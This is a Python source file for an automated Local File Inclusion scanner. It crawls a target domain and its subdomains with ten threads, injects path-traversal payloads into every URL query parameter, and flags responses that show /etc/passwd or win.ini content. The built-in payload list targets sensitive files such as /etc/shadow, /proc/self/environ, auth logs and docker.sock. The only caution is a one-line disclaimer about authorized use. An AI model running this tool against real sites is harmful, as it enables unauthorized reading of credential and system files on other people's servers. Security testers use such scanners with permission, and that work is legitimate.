import requests
from urllib.parse import urljoin, urlparse, urlencode, parse_qs
from bs4 import BeautifulSoup
import tldextract
from concurrent.futures import ThreadPoolExecutor
import time
import os

# 🎯 Default LFI Payloads for testing
payloads = [
    "../../../../../../../../etc/passwd",
    "../../../../../../../../etc/shadow",
    "../../../../../../../../var/log/auth.log",
    "../../../../../windows/win.ini",
    "/etc/passwd",
    "../../../../../../../../windows/system32/drivers/etc/hosts",
    "../../../../../../../../usr/local/apache2/logs/error_log",
    "../../../../../../../../proc/self/environ",
    "../../../../../../../../etc/issue",
    "../../../../../../../../opt/lampp/logs/access_log",
    "../../../../../../../../etc/group",
    "../../../../../../../../etc/hosts",
    "../../../../../../../../etc/motd",
    "../../../../../../../../etc/shells",
    "../../../../../../../../etc/network/interfaces",
    "../../../../../../../../etc/crontab",
    "../../../../../../../../etc/apt/sources.list",
    "../../../../../../../../etc/hostname",
    "../../../../../../../../etc/resolv.conf",
    "../../../../../../../../etc/mail.rc",
    "../../../../../../../../etc/postfix/main.cf",
    "../../../../../../../../etc/aliases",
    "../../../../../../../../etc/exports",
    "../../../../../../../../etc/fstab",
    "../../../../../../../../etc/inittab",
    "../../../../../../../../etc/ld.so.conf",
    "../../../../../../../../etc/logrotate.conf",
    "../../../../../../../../etc/mtab",
    "../../../../../../../../etc/nsswitch.conf",
    "../../../../../../../../etc/opt/samba/smb.conf",
    "../../../../../../../../etc/profile",
    "../../../../../../../../etc/protocols",
    "../../../../../../../../etc/securetty",
    "../../../../../../../../etc/services",
    "../../../../../../../../etc/sysctl.conf",
    "../../../../../../../../etc/systemd/system.conf",
    "../../../../../../../../etc/timezone",
    "../../../../../../../../etc/vsftpd.conf",
    "../../../../../../../../usr/lib/python3/dist-packages/apt_pkg.so",
    "../../../../../../../../usr/share/common-licenses/GPL",
    "../../../../../../../../var/log/alternatives.log",
    "../../../../../../../../var/log/apport.log",
    "../../../../../../../../var/log/apt/history.log",
    "../../../../../../../../var/log/apt/term.log",
    "../../../../../../../../var/log/auth.log",
    "../../../../../../../../var/log/boot.log",
    "../../../../../../../../var/log/dpkg.log",
    "../../../../../../../../var/log/faillog",
    "../../../../../../../../var/log/kern.log",
    "../../../../../../../../var/log/lastlog",
    "../../../../../../../../var/log/syslog",
    "../../../../../../../../var/log/wtmp",
    "../../../../../../../../var/log/xferlog",
    "../../../../../../../../var/www/html/index.html",
    "../../../../../../../../proc/self/cmdline",
    "../../../../../../../../proc/self/status",
    "../../../../../../../../proc/version",
    "../../../../../../../../proc/net/arp",
    "../../../../../../../../proc/net/fib_trie",
    "../../../../../../../../proc/net/tcp",
    "../../../../../../../../proc/net/udp",
    "../../../../../../../../proc/net/unix",
    "../../../../../../../../proc/net/route",
    "../../../../../../../../proc/net/rt_cache",
    "../../../../../../../../proc/self/mounts",
    "../../../../../../../../var/run/utmp",
    "../../../../../../../../var/run/docker.sock"
]


# 🔁 Visited URLs to avoid duplicates
visited_urls = set()
output_results = []

def is_subdomain(url, domain):
    """
    🕵️‍♂️ Check if a URL belongs to the same domain or its subdomains.
    """
    extracted_main = tldextract.extract(domain)
    extracted_url = tldextract.extract(url)
    return extracted_url.domain == extracted_main.domain and extracted_url.suffix == extracted_main.suffix

def find_urls(url, domain):
    """
    🌐 Crawl a given URL and return a list of internal links.
    """
    urls = []
    try:
        headers = {"User-Agent": "Mozilla/5.0 (LFI Scanner)"}
        response = requests.get(url, headers=headers, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')

        for link in soup.find_all('a', href=True):
            full_url = urljoin(url, link['href'])
            if is_subdomain(full_url, domain) and full_url not in visited_urls:
                visited_urls.add(full_url)
                urls.append(full_url)
                time.sleep(1)  # Introduce delay
    except Exception as e:
        print(f"❌ Error crawling {url}: {e}")
    return urls

def test_lfi(url):
    """
    🧪 Test LFI payloads on all parameters of a URL.
    """
    try:
        parsed_url = urlparse(url)
        params = dict(parse_qs(parsed_url.query))
        headers = {"User-Agent": "Mozilla/5.0 (LFI Scanner)"}

        for param in params:
            for payload in payloads:
                # 🚀 Inject payload into the parameter
                test_params = params.copy()
                test_params[param] = payload
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params, doseq=True)}"

                print(f"🔍 Testing: {test_url}")
                response = requests.get(test_url, headers=headers, timeout=5)

                # 🔎 Check if payload reflects in the response
                if any(indicator in response.text.lower() for indicator in ["root:", "[boot loader]", "[extensions]", "[default]"]):
                    result = f"✅ [VULNERABLE] Parameter '{param}' is vulnerable to LFI on {test_url}"
                    print(result)
                    output_results.append(result)
                    return True
        result = f"🛡️ [SAFE] No vulnerabilities found for {url}"
        print(result)
        output_results.append(result)
    except Exception as e:
        error_message = f"❌ Error testing {url}: {e}"
        print(error_message)
        output_results.append(error_message)
    return False

def load_from_file(file_path):
    if not os.path.exists(file_path):
        print(f"❌ File not found: {file_path}")
        return []

    with open(file_path, 'r') as file:
        items = [line.strip() for line in file.readlines() if line.strip()]
    print(f"📂 Loaded {len(items)} items from {file_path}")
    return items

def crawl_and_test(urls, output_file="lfi_results.txt", max_depth=3):
    """
    🔍 Crawl a list of URLs and their subdomains to find potential LFI vulnerabilities.
    """
    for url in urls:
        print(f"🚀 Starting crawl on URL: {url}")
        urls_to_test = [url]
        depth = 0

        domain = urlparse(url).netloc

        # ThreadPoolExecutor for parallel URL testing
        with ThreadPoolExecutor(max_workers=10) as executor:
            while urls_to_test and depth < max_depth:
                current_urls = urls_to_test[:10]  # Limit to first 10 URLs at each depth
                urls_to_test = urls_to_test[10:]

                # Crawl URLs and test them in parallel
                futures = [executor.submit(find_urls, url, domain) for url in current_urls]
                for future in futures:
                    urls = future.result()
                    urls_to_test.extend(urls)

                # Test the URLs for LFI vulnerabilities
                futures = [executor.submit(test_lfi, url) for url in current_urls]
                for future in futures:
                    future.result()  # Wait for the result

                depth += 1

    # Save results to the output file automatically
    with open(output_file, 'w') as f:
        f.write("\n".join(output_results))
    print(f"\n📁 Results saved automatically to: {output_file}")

if __name__ == "__main__":
    print("🌟 Welcome to LFI Parameter Finder 🌟")
    print("🔑 Example Input: https://example.com")
    print("⚠️ Disclaimer: Use this tool only for educational purposes and authorized testing!")

    urls_option = input("📂 Do you want to load URLs from a .txt file? (y/n): ").lower()
    if urls_option == 'y':
        urls_file_path = input("📂 Enter the path to the .txt file containing URLs: ")
        urls = load_from_file(urls_file_path)
    else:
        target_url = input("🔗 Enter the target URL (e.g., https://example.com): ")
        urls = [target_url]

    output_file = input("📂 Enter the name of the output file (leave blank for default 'lfi_results.txt'): ").strip()
    payloads_option = input("📂 Do you want to load payloads from a .txt file? (y/n): ").lower()

    if payloads_option == 'y':
        payloads_file_path = input("📂 Enter the path to the .txt file containing payloads: ")
        payloads = load_from_file(payloads_file_path)

    # Use default filename if none is provided
    output_file = output_file if output_file else "lfi_results.txt"

    if urls:
        crawl_and_test(urls, output_file)
    else:
        print("❌ Error: Please provide valid URLs.")
